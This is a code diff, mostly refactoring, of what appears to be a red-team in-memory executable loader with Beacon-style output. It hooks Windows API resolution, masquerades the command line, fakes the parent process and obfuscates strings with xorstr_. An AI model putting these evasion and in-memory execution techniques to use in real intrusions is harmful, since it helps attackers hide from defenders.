@@ -11,6 +11,10 @@
 #define _forceinline __attribute__((always_inline)) inline
 #endif
 
+/*==============================================================================
+ * Compile-time Hash
+ *============================================================================*/
+
 constexpr unsigned __shift = ([]() constexpr -> unsigned {
   unsigned shifts[] = {1, 3, 5, 7, 11, 13, 17, 19, 23, 29};
   return shifts[__TIME__[7] - '0'];
@@ -42,16 +46,20 @@ template <class CharT> _forceinline unsigned HashRT(const CharT *s) {
 }
 
 extern "C" {
+/*==============================================================================
+ * Shellcode external entry point (-fno-toplevel-reorder)
+ *============================================================================*/
+
 #include "hookspub.h"
 #include "stdarg.h"
 
 HookResult HookControlEntry(HookControl id, va_list args);
 
-// clang-format off
 #ifdef HOOKS_DLL
 __declspec(dllexport)
 #endif
-HookResult __HookControlEntry(HookControl id, ...) {
+HookResult
+__HookControlEntry(HookControl id, ...) {
   va_list args;
   va_start(args, id);
   HookResult result = HookControlEntry(id, args);
@@ -59,8 +67,13 @@ HookResult __HookControlEntry(HookControl id, ...) {
   return result;
 }
 
+/*==============================================================================
+ * Hook Foundation
+ *============================================================================*/
+
 #include "hooks.hpp"
 
+// clang-format off
 #include "simplelist1.c"
 #include "simplelist2.c"
 #include "pipeserver.c"
@@ -99,10 +112,6 @@ HookResult __HookControlEntry(HookControl id, ...) {
 
 #define Kernel32Base          (getctx()->Kernel32Base)
 // clang-format on
-
-/*
- * Log
- */
 
 void BeaconPrintfPostMsg(int type, const char *fmt, ...) {
   char *str = NULL;
@@ -184,9 +193,9 @@ out:
     free(wstr);
 }
 
-/*
- * Hooks
- */
+/*==============================================================================
+ * Hook Implementations
+ *============================================================================*/
 
 VOID WINAPI MyExitProcess(_In_ UINT uExitCode) {
   TRACEF("ExitProcess was called.");
@@ -213,7 +222,7 @@ VOID WINAPI MyExitProcess(_In_ UINT uExitCode) {
                                     (DWORD)(SIZE_T)NtCurrentThreadId());
     DWORD WINAPI HookControlSelfUnloadProc(LPVOID lpThreadParameter);
     HANDLE hSelfUnloadThread = CreateThread(
-        NULL, 0, (LPTHREAD_START_ROUTINE)AddressOfHookControlSelfUnloadProc,
+        NULL, 0, (LPTHREAD_START_ROUTINE)AddressOf(HookControlSelfUnloadProc),
         hLastThread, 0, NULL);
     if (hSelfUnloadThread) {
       CloseHandle(hSelfUnloadThread);
@@ -295,8 +304,7 @@ BOOL WINAPI MyWriteFile(_In_ HANDLE hFile,
         len -= 1;
       if (len >= 1 && s[len - 1] == '\r')
         len -= 1;
-      char format[] = "%.*s";
-      _BeaconPrint(type, format, len, s);
+      _BeaconPrint(type, xorstr_("%.*s"), len, s);
     }
   }
   return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite,
@@ -437,61 +445,61 @@ FARPROC WINAPI MyGetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName) {
     // Prevent from exiting process (see
     // https://github.com/golang/go/blob/go1.23.0/src/runtime/proc.go#L296)
     if (hash == HashCT("ExitProcess"))
-      return (FARPROC)AddressOfMyExitProcess;
+      return (FARPROC)AddressOf(MyExitProcess);
 
     // Masquerade command-line
     if (HasFeatures(HookFeatureCommandLine)) {
       if (hash == HashCT("GetCommandLineA"))
-        return (FARPROC)AddressOfMyGetCommandLineA;
+        return (FARPROC)AddressOf(MyGetCommandLineA);
       if (hash == HashCT("GetCommandLineW"))
-        return (FARPROC)AddressOfMyGetCommandLineW;
+        return (FARPROC)AddressOf(MyGetCommandLineW);
     }
 
     // Redirect stdio
     if (HasFeatures(HookFeatureRedirectStdio) && hash == HashCT("GetStdHandle"))
-      return (FARPROC)AddressOfMyGetStdHandle;
+      return (FARPROC)AddressOf(MyGetStdHandle);
 
     // For cobra command line parser (see
     // https://github.com/spf13/cobra/blob/main/command_win.go) (used by frp)
     if (HasFeatures(HookFeatureGoCobraFakeParentProcess) &&
         hash == HashCT("Process32NextW"))
-      return (FARPROC)AddressOfMyProcess32NextW;
+      return (FARPROC)AddressOf(MyProcess32NextW);
 
     // Streaming stdout/stderr
     if (HasFeatures(HookFeatureStreamingOutput) && hash == HashCT("WriteFile"))
-      return (FARPROC)AddressOfMyWriteFile;
+      return (FARPROC)AddressOf(MyWriteFile);
 
     if (HasFeatures(HookFeatureUnload | HookFeatureGo)) {
       // Hook CreateThread to collect all go routines
       if (hash == HashCT("CreateThread"))
-        return (FARPROC)AddressOfMyCreateThread;
+        return (FARPROC)AddressOf(MyCreateThread);
       // Hook VEH functions to collect VEHs (see
       // https://github.com/golang/go/blob/go1.23.0/src/runtime/signal_windows.go#L50)
       if (hash == HashCT("AddVectoredExceptionHandler"))
-        return (FARPROC)AddressOfMyAddVectoredExceptionHandler;
+        return (FARPROC)AddressOf(MyAddVectoredExceptionHandler);
       if (hash == HashCT("AddVectoredContinueHandler"))
-        return (FARPROC)AddressOfMyAddVectoredContinueHandler;
+        return (FARPROC)AddressOf(MyAddVectoredContinueHandler);
       // Prevent program from crashing when closing console window (see
       // https://github.com/golang/go/blob/go1.23.0/src/runtime/os_windows.go#L543)
       if (hash == HashCT("SetConsoleCtrlHandler"))
-        return (FARPROC)AddressOfMySetConsoleCtrlHandler;
+        return (FARPROC)AddressOf(MySetConsoleCtrlHandler);
       // Track pages allocated from VirtualAlloc
       if (hash == HashCT("VirtualAlloc"))
-        return (FARPROC)AddressOfMyVirtualAlloc;
+        return (FARPROC)AddressOf(MyVirtualAlloc);
       if (hash == HashCT("VirtualFree"))
-        return (FARPROC)AddressOfMyVirtualFree;
+        return (FARPROC)AddressOf(MyVirtualFree);
       if (hash == HashCT("TlsAlloc"))
-        return (FARPROC)AddressOfMyTlsAlloc;
+        return (FARPROC)AddressOf(MyTlsAlloc);
     }
 
     // Dynamic resolution (e.g. UPX)
     if (hash == HashCT("GetProcAddress"))
-      return (FARPROC)AddressOfMyGetProcAddress;
+      return (FARPROC)AddressOf(MyGetProcAddress);
   }
   // cgo only
   if (hash == HashCT("_beginthread") && HasFeatures(HookFeatureGo) &&
       hModule == GetModuleHandleA(xorstr_("msvcrt.dll")))
-    return (FARPROC)AddressOfMybeginthread;
+    return (FARPROC)AddressOf(Mybeginthread);
   return GetProcAddress(hModule, lpProcName);
 }
 
@@ -509,9 +517,9 @@ DWORD WINAPI RunExeEntryProc(LPVOID lpThreadParameter) {
   return -1;
 }
 
-/*
- * Hook control
- */
+/*==============================================================================
+ * Hook Control
+ *============================================================================*/
 
 HookResult HookControlCreateImpl(HookContext *ctx, void *stdin_, int stdinSize,
                                  char *commandLineA, int commandLineASize,
@@ -545,9 +553,9 @@ HookResult HookControlCreateImpl(HookContext *ctx, void *stdin_, int stdinSize,
     if (!stdin_ || stdinSize < 0)
       return HookResultErrorInvalidArgument;
     if (!CreateWritePipeServer(&StdinPipe, stdin_, stdinSize,
-                               AddressOfWritePipeServerProc) ||
-        !CreateReadPipeServer(&StdoutPipe, AddressOfReadPipeServerProc) ||
-        !CreateReadPipeServer(&StderrPipe, AddressOfReadPipeServerProc))
+                               AddressOf(WritePipeServerProc)) ||
+        !CreateReadPipeServer(&StdoutPipe, AddressOf(ReadPipeServerProc)) ||
+        !CreateReadPipeServer(&StderrPipe, AddressOf(ReadPipeServerProc)))
       return HookResultErrorCreatePipeServers;
   }
 
@@ -574,7 +582,7 @@ HookResult HookControlCreateImpl(HookContext *ctx, void *stdin_, int stdinSize,
     return HookResultErrorCreateKernel32Base;
 
   // Return detours
-  ctx->MyGetProcAddress = AddressOfMyGetProcAddress;
+  ctx->MyGetProcAddress = AddressOf(MyGetProcAddress);
 
   return HookResultSuccess;
 }
@@ -627,15 +635,13 @@ void HookControlDeleteImpl(HookContext *ctx) {
 HookResult HookControlStartImpl(HookContext *ctx, void *entryPoint) {
   TRACEF("HookControlStartImpl was called.");
 
+  LPTHREAD_START_ROUTINE runExeEntry =
+      (LPTHREAD_START_ROUTINE)AddressOf(RunExeEntryProc);
   HANDLE hThread;
   if (HasFeatures(HookFeatureUnload | HookFeatureGo))
-    hThread = MyCreateThread(NULL, 0,
-                             (LPTHREAD_START_ROUTINE)AddressOfRunExeEntryProc,
-                             (PVOID)entryPoint, 0, NULL);
+    hThread = MyCreateThread(NULL, 0, runExeEntry, entryPoint, 0, NULL);
   else
-    hThread =
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AddressOfRunExeEntryProc,
-                     (PVOID)entryPoint, 0, NULL);
+    hThread = CreateThread(NULL, 0, runExeEntry, entryPoint, 0, NULL);
   if (!hThread)
     return HookResultErrorStartNewThread;
   CloseHandle(hThread);
